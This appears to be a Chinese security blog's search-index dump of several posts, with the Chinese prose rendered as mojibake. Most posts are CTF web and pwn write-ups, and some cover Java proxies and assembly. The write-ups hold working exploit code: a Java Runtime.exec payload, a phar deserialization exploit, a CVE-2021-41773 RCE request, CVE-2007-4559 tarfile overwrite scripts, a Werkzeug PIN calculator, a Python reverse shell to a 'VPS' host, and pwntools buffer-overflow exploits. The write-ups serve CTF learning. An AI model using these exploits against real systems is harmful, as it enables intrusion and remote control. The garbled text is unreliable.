äºæ˜¯æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹payloadå°±å¯ä»¥æ‰§è¡Œ public class Arrd2 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException { Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;); cls.getMethod(&quot;exec&quot;, String.class).invoke(cls.getMethod(&quot;getRuntime&quot;).invoke(cls), &quot;curl 127.0.0.1:8000&quot;); }} å°†ä¸Šè¿°payloadåˆ†è§£ä¸€ä¸‹ï¼Œæ›´å®¹æ˜“ç†è§£ Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);Method execMethod = cls.getMethod(&quot;exec&quot;, String.class);Method getRuntimeMethod = cls.getMethod(&quot;getRuntime&quot;);Object runtime = getRuntimeMethod.invoke(cls);execMethod.invoke(runtime, &quot;curl 127.0.0.1:8000&quot;); import java.io.IOException;public class Arrd2 { public static void main(String[] args) throws IOException, InterruptedException { Runtime rt = Runtime.getRuntime(); String[] commands = {&quot;open&quot;, &quot;/System/Applications/Calculator.app&quot;}; Process pc = rt.exec(commands); pc.waitFor(); }} import java.io.IOException;public class Arrd2 { public static void main(String[] args) throws IOException { Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); }} Javaä»£ç†Javaæœ‰ä¸‰ç§ä»£ç†æ¨¡å¼é™æ€ä»£ç†ã€åŠ¨æ€ä»£ç†å’Œcglibä»£ç† é™æ€ä»£ç† ä¼˜ç‚¹ï¼š å¯ä»¥è¾¾åˆ°åŠŸèƒ½å¢å¼ºçš„ç›®çš„ï¼Œå®ç°ç®€å•ä¸”ä¸ä¾µå…¥æºä»£ç  ç¼ºç‚¹ï¼š å½“éœ€è¦ä»£ç†å¤šä¸ªç±»æ—¶ï¼Œç”±äºä»£ç†å¯¹è±¡è¦å®ç°ä¸ç›®æ ‡å¯¹è±¡ä¸€è‡´çš„æ¥å£ï¼Œå¯¼è‡´ä»£ç†ç±»è¿‡äºåºå¤§ï¼Œç¹å¤šã€‚ å½“æ¥å£éœ€è¦å¢åˆ æ”¹æ–¹æ³•æ—¶ï¼Œä»£ç†ç±»ä¸ç›®æ ‡å¯¹è±¡éƒ½è¦ä¿®æ”¹ï¼Œä¸æ˜“ç»´æŠ¤ ä»£ç†ç±»å’Œç›®æ ‡ç»Ÿä¸€æ¥å£ public interface Hello { public void sayHello(String name);} å®ç°ç±» public class Start implements Hello{ @Override public void sayHello(String name) { System.out.println(name + &quot; said: \\&quot;hello everyone\\&quot;&quot;); }} åˆ›å»ºé™æ€ä»£ç†ç±»ï¼Œå®ç°æ¥å£ï¼Œå¹¶ä¸”æ‹“å±•æ¥å£æ–¹æ³•sayHello public class DyProxy implements Hello{ private Hello target; public DyProxy(Hello obj) { this.target = obj; } @Override public void sayHello(String name) { System.out.println(&quot;æˆ‘æ˜¯ä»£ç†&quot;); this.target.sayHello(name); }} æµ‹è¯•ç±» public class App { public static void main(String[] args) { Hello hello = new Start(); Hello helloProxy = new DyProxy(hello); helloProxy.sayHello(&quot;qqw&quot;); }} ç»“æœ é€šè¿‡é™æ€ä»£ç†ï¼Œæˆ‘ä»¬å®ç°äº†æ‰©å±•æ¥å£æ–¹æ³•ï¼Œè€Œä¸”æ²¡æœ‰ä¾µå…¥æºä»£ç  åŠ¨æ€ä»£ç†ä¸¤è€…åŒºåˆ« é™æ€ä»£ç†åœ¨ç¼–è¯‘æ—¶å°±å·²ç»å®ç°ï¼Œç¼–è¯‘å®Œæˆåä»£ç†ç±»æ˜¯ä¸€ä¸ªå®é™…çš„classæ–‡ä»¶ åŠ¨æ€ä»£ç†æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„ï¼Œå³ç¼–è¯‘å®Œæˆåæ²¡æœ‰å®é™…çš„classæ–‡ä»¶ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆç±»å­—èŠ‚ç ï¼Œå¹¶åŠ è½½åˆ°JVMä¸­ æ¥å£å’Œå®ç°ç±»ä¸å˜ï¼Œæˆ‘ä»¬å†åˆ›å»ºä¸€ä¸ªåŠ¨æ€ä»£ç†ç±» import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class DyProxy{ private Hello target; //ç»´æŠ¤ç›®æ ‡å¯¹è±¡ public DyProxy(Hello obj) { this.target = obj; } public Object getProxyInstance() { return Proxy.newProxyInstance(this.target.getClass().getClassLoader(), this.target.getClass().getInterfaces(), new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); System.out.println(&quot;æˆ‘æ˜¯ä»£ç†&quot;); method.invoke(target, args); return null; } }); }} å¯ä»¥å‘ç°ï¼ŒåŠ¨æ€ä»£ç†ä¸éœ€è¦å®ç°æ¥å£ï¼Œä½†å¿…é¡»è¦æ±‚ç›®æ ‡å¯¹è±¡è¦å®ç°æ¥å£ï¼Œå› ä¸ºï¼š new ProxyInstance(ClassLoader loader, //æŒ‡å®šå½“å‰ç›®æ ‡å¯¹è±¡ä½¿ç”¨ç±»åŠ è½½å™¨ Class&lt;?&gt;[] interfaces, //ç›®æ ‡å¯¹è±¡å®ç°çš„æ¥å£çš„ç±»å‹ InvocationHandler handler //äº‹ä»¶å¤„ç†å™¨) ProxyInstanceæ–¹æ³•ç¬¬äºŒä¸ªå‚æ•°éœ€è¦ç›®æ ‡å¯¹è±¡å®ç°çš„æ¥å£ ç¬¬ä¸‰ä¸ªå‚æ•°InvocationHandlerï¼Œå¿…é¡»è¦å®ç°invokeæ–¹æ³• æµ‹è¯•ç±» public class App { public static void main(String[] args) { Hello hello = new Start(); DyProxy dyProxy = new DyProxy(hello); Hello helloProxy2 = (Hello) dyProxy.getProxyInstance(); System.out.println(helloProxy2.getClass()); //è¾“å‡ºä»£ç†å¯¹è±¡ç±»ä¿¡æ¯ helloProxy2.sayHello(&quot;qqw&quot;); //æ‰§è¡Œä»£ç†æ–¹æ³• }} å‚è€ƒhttps://github.com/Maskhe/javasec/blob/master/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86.md https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984#0 https://mp.weixin.qq.com/s?__biz=MzI1NDU0MTE1NA==&amp;mid=2247483792&amp;idx=1&amp;sn=3235b732de5773c982726c3d0bbbe66c&amp;chksm=e9c2ed9ddeb5648b4529c5f60a8629175e1a62e65d91968c58a56a69bb77a18e1968e2633f87&amp;scene=0#rd","link":"/2022/09/07/javaref/"},{"title":"ç‹çˆ½æ±‡ç¼–LAB-9","text":"æ±‡ç¼–å®éªŒ9 æ˜¾ç¤ºé—ªçƒçš„å­—ç¬¦ä¸²assume cs:code, ds:datadata segmentdw 1920,2080,2240,64db 'welcome to JULNK'db 82h,0ach,0f9hdata endscode segmentstart: mov ax,data mov ds,ax mov ax,0B800h mov es,ax mov cx,3 xor di,di xor si,sis1: mov ax,di mov bl,2 div bl mov si,ax mov ah,[si+24] mov si,ds:[6] mov bp,[di] mov dx,cx mov bx,0 mov cx,16s2: mov al,[bx+8] mov es:[bp+si],al mov es:[bp+si+1],ah inc bx add si,2 loop s2 mov cx,dx add di,2 loop s1 mov ax,4c00h int 21hcode endsend start æ•ˆæœå¦‚ä¸‹","link":"/2021/12/04/lab9/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new &quot;My New Post&quot; More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment","link":"/2021/11/15/hello-world/"},{"title":"NSSRound#4&amp;5 Webé¢˜è§£","text":"[NSSRound#4&amp;5] Webé¢˜è§£ 1zweb(revenge)å› ä¸ºé¢˜ç›®å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œç„¶ååŸé¢˜æ²¡banflagå…³é”®å­—ï¼Œå¯ä»¥ç›´æ¥è¯»äº† ä¸»è¦è€ƒç‚¹å°±æ˜¯ ååºåˆ—åŒ– pharæ–‡ä»¶ç›¸å…³åˆ©ç”¨æ‰‹æ³• é¦–å…ˆçœ‹åˆ°é¡µé¢æŸ¥è¯¢æ–‡ä»¶ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç›´æ¥å…ˆæŠŠä¸¤ä¸ªæºç è¯»å‡ºæ¥ index.php &lt;?phpclass LoveNss{ public $ljt; public $dky; public $cmd; public function __construct(){ $this-&gt;ljt=&quot;ljt&quot;; $this-&gt;dky=&quot;dky&quot;; phpinfo(); } public function __destruct(){ if($this-&gt;ljt===&quot;Misc&quot;&amp;&amp;$this-&gt;dky===&quot;Re&quot;) eval($this-&gt;cmd); } public function __wakeup(){ $this-&gt;ljt=&quot;Re&quot;; $this-&gt;dky=&quot;Misc&quot;; }} upload.php &lt;?phpif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){ echo &quot;ä¸Šä¼ å¼‚å¸¸&quot;;}else{ $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;); $temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if (($_FILES[&quot;file&quot;][&quot;size&quot;] &amp;&amp; in_array($extension, $allowedExts))){ $content=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); $pos = strpos($content, &quot;__HALT_COMPILER();&quot;); if(gettype($pos)===&quot;integer&quot;){ echo &quot;ltjä¸€çœ¼å°±å‘ç°äº†phar&quot;; }else{ if (file_exists(&quot;./upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])){ echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; æ–‡ä»¶å·²ç»å­˜åœ¨&quot;; }else{ $myfile = fopen(&quot;./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;], &quot;w&quot;); fwrite($myfile, $content); fclose($myfile); echo &quot;ä¸Šä¼ æˆåŠŸ ./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]; } } }else{ echo &quot;dkyä¸å–œæ¬¢è¿™ä¸ªæ–‡ä»¶ .&quot;.$extension; }}?&gt; æ€è·¯å¾ˆæ¸…æ™°ï¼Œåˆ©ç”¨file_get_contentsè¯»pharæ–‡ä»¶å»è§¦å‘ååºåˆ—åŒ–ï¼Œæ‰§è¡Œ__destruct()æ–¹æ³•ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œ exp &lt;?phpclass LoveNss{public $ljt=&quot;Misc&quot;;public $dky=&quot;Re&quot;;public $cmd=&quot;system('cat /flag');&quot;;}$a = new LoveNss();$phar = new Phar(&quot;lnk.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetaData($test);$phar-&gt;addFromString(&quot;exp.txt&quot;,&quot;exp&quot;);$phar-&gt;stopBuffering(); ç„¶å010ä¿®æ”¹å±æ€§ä¸ªæ•°ç»•è¿‡wakeupï¼Œå†ä¿®æ­£ä¸€ä¸‹ç­¾å #!/usr/bin/env python3from hashlib import sha1with open('./lnk.phar', 'rb') as f: content = f.read() # ç­¾åæ•°æ®28ä¸ªå­—èŠ‚ main = content[:-28] # ç­¾åç±»å‹åŠGBMBæ ‡è¯† hs = content[-8:] # æ•°æ® + ç­¾å + ç±»å‹ + GBMB new = main + sha1(main).digest() + hs open(&quot;test.phar&quot;, &quot;wb&quot;).write(new) ä¹‹åæ–‡ä»¶å†…å®¹ç»•è¿‡ï¼Œè‡ªç„¶æƒ³åˆ°gzipå‹ç¼©ä¸€ä¸‹ æ”¹ä¸€ä¸‹åç¼€åä¸Šä¼ ï¼Œç„¶åä¼ªåè®®ç›´æ¥è¯» ez_rceè€ƒç‚¹ CVE-2021-41773 linuxå‘½ä»¤ æ‰“å¼€é¢˜ç›®å‘ç°åªæœ‰ä¸€ä¸ªit worksæŠ“ä¸ªåŒ…å‘ç°äº†apacheä¸­é—´ä»¶çš„ç‰ˆæœ¬ æœç´¢å¯ä»¥å‘ç°CVE-2021-41773 Apache HTTPd 2.4.49 è·¯å¾„ç©¿è¶Šä»¥åŠRCEæ¼æ´ åˆ©ç”¨å¦‚ä¸‹æ•°æ®åŒ… POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: 1.14.71.254:28909User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 28echo;id å‘ç°å¯ä»¥æˆåŠŸæ‰§è¡Œ æ¥ç€å°±æ˜¯è¿™é¢˜é‡‡å–äº†ä¸€ä¸ªæ–‡ä»¶å¤¹è¿·å®«ï¼Œå­˜åœ¨å¤šå±‚ï¼Œå¯ä»¥åˆ©ç”¨grepå‘½ä»¤è¿›è¡Œé€’å½’æŸ¥æ‰¾","link":"/2022/08/31/nssr45/"},{"title":"NSSRound#6 Webé¢˜è§£","text":"NSSRound#6 Webé¢˜è§£ check(V1)/check(V2)éé¢„æœŸåˆ©ç”¨è½¯é“¾æ¥ä¸Šä¼ æ–‡ä»¶å®ç°ä»»æ„æ–‡ä»¶è¯»å– é¦–å…ˆ ln -s /flag exp.txt ç„¶åï¼Œä»£ç ä¸€æŠŠæ¢­ import requestsimport tarfileimport os # &quot;w:gz&quot; = æ‰“åŒ…å¹¶ä¸”å‹ç¼© &quot;w&quot; = æ‰“åŒ…ä½†ä¸å‹ç¼©# æ‰“åŒ…æˆtaråŒ…def makeTar(outputFileName, sourceDir): with tarfile.open(outputFileName, &quot;w&quot; ) as tar: tar.add(sourceDir, arcname = os.path.basename(sourceDir))def upload(): url = &quot;http://43.142.108.3:28840/upload&quot; resp = requests.post(url=url, files={&quot;file&quot;: open(&quot;./exp.tar&quot;, &quot;rb&quot;)}) print(resp.text)def download(): url = &quot;http://43.142.108.3:28840/download&quot; data = {&quot;filename&quot;: &quot;exp.txt&quot;} resp = requests.post(url=url, data=data) print(resp.text)makeTar(&quot;./exp.tar&quot;, &quot;./exp.txt&quot;)upload()download() check(v1)é¢„æœŸCVE-2007-4559 æ¯”å¦‚æˆ‘ä»¬æ„é€ ä¸€ä¸ªexp.shåå¼¹shellï¼Œè¦†ç›–å®Œåå»è§¦å‘cleançš„è·¯ç”±ï¼Œå°±æ‰§è¡Œäº†os.system('/tmp/exp.sh') è„šæœ¬ä¸€æŠŠæ¢­ å‚è€ƒè¿™é‡Œ import tarfileimport requestsurl = 'http://43.142.108.3:28648'def change_name(tarinfo): tarinfo.name = &quot;../../../../../../../../tmp/clean.sh&quot; return tarinfowith tarfile.open(&quot;exp.tar&quot;, &quot;w:xz&quot;) as tar: tar.add(&quot;exp.sh&quot;, filter=change_name)resp = requests.post(url=url + &quot;/upload&quot;, files={&quot;file&quot;: open(&quot;exp.tar&quot;, &quot;rb&quot;)})print(resp.text)res = requests.post(url=url + &quot;/clean&quot;)print(res.text) check(v2)é¢„æœŸè¿™ä¸ªçš„è¯ï¼Œä¹Ÿæ˜¯åŒæ ·è¦†ç›–clean.shï¼Œæ‹¿åˆ°shellåï¼Œå› ä¸ºæ˜¯ctfç”¨æˆ·ï¼Œæ‰€ä»¥æ²¡æœ‰è¯»flagçš„æƒé™ ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ä»–æ˜¯ç”¨debugæ¨¡å¼å¯åŠ¨ï¼Œæ‰€ä»¥åˆ©ç”¨consoleåå°ï¼Œç®—å‡ºpinç å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ å› ä¸ºç½‘ä¸Šè„šæœ¬å¾ˆå¤šï¼Œè¿™é‡Œä¸»è¦çœ‹ä¸‹é«˜ç‰ˆæœ¬çš„åŒºåˆ« # é¦–å…ˆé«˜ç‰ˆæœ¬åˆ©ç”¨çš„ç®—æ³•æ˜¯ hashlib.sha1()# è¿˜æœ‰get_machine_id()def get_machine_id() -&gt; t.Optional[t.Union[str, bytes]]: global _machine_id if _machine_id is not None: return _machine_id def _generate() -&gt; t.Optional[t.Union[str, bytes]]: linux = b&quot;&quot; # machine-id is stable across boots, boot_id is not. for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;: # è¿™é‡Œå¯ä»¥çŸ¥é“ï¼Œ/etc/machine-idä¼˜å…ˆçº§è¦é«˜ï¼Œå¦‚æœè¿™ä¸ªå­˜åœ¨å°±ç›´æ¥breakå‡ºå» try: with open(filename, &quot;rb&quot;) as f: value = f.readline().strip() except OSError: continue if value: linux += value break try: with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f: linux += f.readline().strip().rpartition(b&quot;/&quot;)[2] # ç„¶åè¿™é‡Œæ‹¼æ¥ä¸Š/proc/self/cgroupé‚£ä¸€ä¸²å€¼ except OSError: pass if linux: return linux å…·ä½“è„šæœ¬ import hashlibfrom itertools import chainprobably_public_bits = [ 'root' 'flask.app', # é»˜è®¤å€¼ 'Flask', # é»˜è®¤å€¼ '/usr/local/lib/python3.10/site-packages/flask/app.py' #ä¸€èˆ¬é»˜è®¤è·¯å¾„ï¼Œå¯ä»¥ç›´æ¥åˆ°shellé‡Œæ‰¾]private_bits = [ '2485376973374', # /sys/class/net/eth0/address '96cec10d3d9307792745ec3b85c8962050f919b74b931047d05f74cab428795c3bef6a42831948715b3609fe03151669' # /etc/machine-id /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv = Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) check(Revenge)é¢„æœŸå°±æ˜¯v2çš„é¢„æœŸè§£ï¼Œåšæ³•ä¸€æ ·çš„ éé¢„æœŸå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ä»¥debugæ¨¡å¼å¯åŠ¨çš„,åœ¨debugæ¨¡å¼ä¸‹ï¼Œå¦‚æœæœ‰æ–‡ä»¶ä»£ç ä¿®æ”¹ï¼ŒæœåŠ¡å™¨å°±ä¼šè‡ªåŠ¨é‡è½½ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¦†ç›–main.pyï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªpythonçš„åå¼¹shellçš„expï¼Œåˆ©ç”¨CVE-2007-4559ï¼Œè§¦å‘æ‰§è¡Œ # shell.pyimport os,socket,subprocesss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(('VPS',port))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call(['/bin/bash','-i']) # exp.pyimport tarfileimport requestsurl = 'http://43.142.108.3:28317'def change_name(tarinfo): tarinfo.name = &quot;../../../../../../../../app/main.py&quot; return tarinfowith tarfile.open(&quot;exp.tar&quot;, &quot;w:xz&quot;) as tar: tar.add(&quot;shell.py&quot;, filter=change_name)resp = requests.post(url=url + &quot;/upload&quot;, files={&quot;file&quot;: open(&quot;exp.tar&quot;, &quot;rb&quot;)})print(resp.text)res = requests.get(url=url)print(res.text)","link":"/2022/10/28/nssr6/"},{"title":"Pwnable.kr Toddler&#39;s Bottle","text":"0x00 è¯´åœ¨å‰é¢æ”¾å¯’å‡ä¸æƒ³å‡ºå»æ‹œå¹´ã€‚ã€‚ã€‚æ— èŠåœ¨å®¶åšåšé¢˜ï¼Œæƒ³åˆ°ä¹‹å‰ä¸€ç›´æ‰“ç®—åšè¿™ä¸ªç½‘ç«™ä¸Šçš„é¢˜ï¼Œè¶ç€æœ‰æ—¶é—´èµ¶ç´§æ¥è¯•è¯• é“¾æ¥ğŸ”—https://pwnable.kr/play.php 0x01 fdè¿™é¢˜ä¸»è¦è€ƒå¯Ÿç”¨pwntoolsè¿æ¥sshçš„æ–¹æ³•ï¼Œä»¥åŠlinuxæ–‡ä»¶çš„è¾“å…¥è¾“å‡º å…³äºmainå‡½æ•°çš„ä¸‰ä¸ªå‚æ•° int main(int argc, char* argv[], char* envp[]);ç¬¬ä¸€ä¸ªargcè®°å½•è¾“å…¥å‚æ•°çš„ä¸ªæ•° ç¬¬äºŒä¸ªargvæ˜¯å­—ç¬¦ä¸²æ•°ç»„ï¼Œæ˜¯æŒ‡å…·ä½“çš„å‚æ•°ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯å­—ç¬¦ä¸²æŒ‡é’ˆç±»å‹ï¼Œargc[]ä¸­è‡³å°‘æœ‰ä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆï¼Œå³argv[0]ï¼Œé€šå¸¸æŒ‡å‘å¯æ‰§è¡Œç¨‹åºæ–‡ä»¶å ç¬¬ä¸‰ä¸ªè¿™ä¸ªæ•°ç»„çš„æ¯ä¸€ä¸ªå…ƒç´ æ˜¯æŒ‡å‘ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å­—ç¬¦æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯å­˜æ”¾äº†å½“å‰ç¨‹åºè¿è¡Œæ—¶çš„ç¯å¢ƒå˜é‡(å½“å‰ç¨‹åºè¿è¡Œæ—¶å¯¹åº”çš„è¿›ç¨‹åŒ…å«çš„ç¯å¢ƒå˜é‡)ã€‚envp[] çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½åŒ…å«ENVVAR=valueå½¢å¼çš„å­—ç¬¦ä¸²ï¼Œé€šå¸¸ä»¥NULLç»“å°¾ã€‚å…¶ä¸­ENVVARä¸ºç¯å¢ƒå˜é‡å¦‚PATHæˆ–87ã€‚value ä¸ºENVVARçš„å¯¹åº”å€¼å¦‚C:\\DOS, C:\\TURBOC(å¯¹äºPATH) æˆ–YES(å¯¹äº87)ã€‚ å‚è€ƒ å…³äºå¥æŸ„å‚æ•°fd stdin æ ‡å‡†è¾“å…¥çš„æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º0stdout æ ‡å‡†è¾“å‡ºçš„æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º1stderr æ ‡å‡†é”™è¯¯è¾“å‡ºçš„æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º2 exp from pwn import *shell = ssh(host='pwnable.kr', user='fd', password='guest', port=2222)sh = shell.run('./fd ' + str(0x1234))payload = b&quot;LETMEWIN&quot;sh.sendline(payload)sh.interactive() 0x02 collisionç»•è¿‡é‚£ä¸ªhashéªŒè¯çš„å‡½æ•° unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res;} é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ï¼Œä¸€ä¸ªchar*ç±»å‹çš„æŒ‡é’ˆå 1ä¸ªå­—èŠ‚ï¼Œè€Œä¸€ä¸ªint*ç±»å‹çš„æŒ‡é’ˆå 4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å°±ä¼šæœ‰å¦‚ä¸‹çš„åŒºåˆ« char* p = '1234';p[0] =&gt; 1;int* p1 = (int*)p;p1[0] =&gt; 1234; è€Œå‡½æ•°å°†æˆ‘ä»¬æ‰€ä¼ å…¥çš„å†…å®¹åˆ†äº”æ¬¡ç›¸åŠ ï¼Œæ‰€ä»¥æ˜¯æ¯4ä¸ªå­—èŠ‚ä¸ºä¸€ç»„ï¼Œäºæ˜¯æˆ‘ä»¬å°±è¦æƒ³åŠæ³•æ„é€ p &gt;&gt;&gt; int(0x21dd09ec)568134124é™¤ä»¥5æœ‰ä½™æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆè¿›è¡Œä¸€ç‚¹å˜åŒ–ï¼Œæ¯”å¦‚åŠ ä¸ª1&gt;&gt;&gt; 0x21dd09ec + 1568134125&gt;&gt;&gt; 568134125 / 5113626825.0ç„¶åéªŒè¯ä¸€ä¸‹&gt;&gt;&gt; hex(113626825)'0x6c5cec9'&gt;&gt;&gt; 0x6c5cec9 - 1113626824&gt;&gt;&gt; hex(113626824)'0x6c5cec8'&gt;&gt;&gt; 0x6c5cec9 * 4 + 0x6c5cec8568134124&gt;&gt;&gt; hex(568134124)'0x21dd09ec'ç»“æœç¡®å®ä¸€æ · exp from pwn import *shell = ssh(host='pwnable.kr', user='col', password='guest', port=2222)payload = p32(0x6c5cec9) * 4 + p32(0x6c5cec8)sh = shell.run(b'./col ' + payload)sh.interactive() 0x03 bofçœ‹åˆ°getsï¼Œæœ‰åé—¨å‡½æ•°ï¼Œç›´æ¥æ ˆæº¢å‡ºä¿®æ”¹å€¼ï¼Œæ‰§è¡Œsystem exp from pwn import *io = remote('pwnable.kr', 9000)payload = b'a' * (0x2c+8) + p32(0xCAFEBABE)io.sendline(payload)io.interactive() 0x04 flagé¢˜ç›®ç»™äº†æç¤ºäº†ï¼Œé€†å‘é¢˜ï¼Œå…ˆç”¨IDAæ‰“å¼€å‘ç°åªæœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œä¸€å †æ™¦æ¶©çš„æ±‡ç¼–ï¼Œè€ƒè™‘åˆ°åŠ å£³ï¼Œäºæ˜¯ç”¨upx -d flagè„±å£³åï¼ŒIDAç›´æ¥æœå­—ç¬¦ä¸²å¯ä»¥æ‰¾åˆ°ç­”æ¡ˆ 0x05 passcodeå¼€å§‹çœ‹åˆ°ä¿®æ”¹ä¸¤ä¸ªå€¼ï¼Œä»¥ä¸ºæ˜¯æ ˆæº¢å‡ºè¦†ç›–ï¼Œä¹‹åå‘ç°ä¸å¯ä»¥ï¼Œå¼€äº†canaryä¿æŠ¤ï¼Œåªèƒ½æ”¹åˆ°passcode1ï¼Œpasscode2ç›–ä¸åˆ° ç¨‹åºæ¼æ´æˆå› æ˜¯å› ä¸ºï¼Œå‡½æ•°scanfè¾“å…¥çš„æ—¶å€™æ²¡æœ‰åŠ &amp;ï¼Œå¯¼è‡´å°†è¾“å…¥å†…å®¹ä½œä¸ºåœ°å€è¯»å…¶æŒ‡å‘çš„å†…å®¹ï¼Œé€ æˆsegment fault äºæ˜¯è€ƒè™‘åŠ«æŒgotè¡¨ï¼Œå› ä¸ºwelcomeå’Œloginæ˜¯åŒæ—¶è°ƒç”¨çš„ï¼Œä¸¤æ¬¡ebpæ²¡æœ‰å˜ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œè¦†ç›–ï¼Œæˆ‘ä»¬å…ˆåˆ©ç”¨nameå¤„å°†passcode1ä¿®æ”¹ä¸ºä¸€ä¸ªå°†è¦æ‰§è¡Œçš„å‡½æ•°ï¼Œæˆ‘é€‰ç”¨fflushï¼Œç„¶ååœ¨è¯»å…¥passcode1çš„æ—¶å€™æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤åœ°å€ GOTè¡¨å¯æ”¹å†™:GOTè¡¨è®°å½•å¤–éƒ¨å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå¯ä»¥ä¿®æ”¹GOTè¡¨ä¸­è®°å½•çš„åœ°å€ä¸ºæˆ‘ä»¬æƒ³ç¨‹åºæ‰§è¡Œçš„å†…å­˜åœ°å€ï¼Œå½“ç¨‹åºè°ƒç”¨è¢«ä¿®æ”¹äº†GOTè¡¨çš„å‡½æ•°æ—¶ï¼Œåˆ™ä¼šè¿è¡Œæˆ‘ä»¬æ‰€æœŸæœ›çš„å‘½ä»¤ï¼Œè€Œç¨‹åºè®¤ä¸ºè‡ªå·±è¿è¡Œäº†å¤–éƒ¨å‡½æ•°ã€‚ â€‹ exp from pwn import *shell = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)payload = b'a' * (0x70 - 0x10) + p32(0x0804a004)sh = shell.run(b'./passcode')sh.sendlineafter('enter you name : ', payload)sh.sendlineafter('enter passcode1 : ', str(0x080485E3))sh.interactive() 0x06 randoméšæœºæ•°ï¼Œå­¦è¿‡Cè¯­è¨€çš„éƒ½çŸ¥é“ï¼ŒCçš„éšæœºæ•°æ˜¯ä¼ªéšæœºï¼Œä¸”è¿™é¢˜æ²¡æœ‰è°ƒç”¨srandæ¥è®¾ç½®éšæœºç§å­ æ‰€ä»¥æˆ‘åœ¨gdbä¸­åœ¨randå¤„ä¸‹ä¸ªæ–­ç‚¹ï¼Œè·Ÿè¿›ä¸¤æ­¥ï¼Œè¯•äº†å‡ æ¬¡éƒ½å‘ç°åˆå§‹åŒ–çš„éšæœºæ•°éƒ½ä¸ºä¸€ä¸ªå€¼å­˜åœ¨eaxé‡Œ åˆæ ¹æ®å¼‚æˆ–è¿ç®—è§„å¾‹æˆ‘ä»¬çŸ¥é“a^b=c c^b=a 0x07 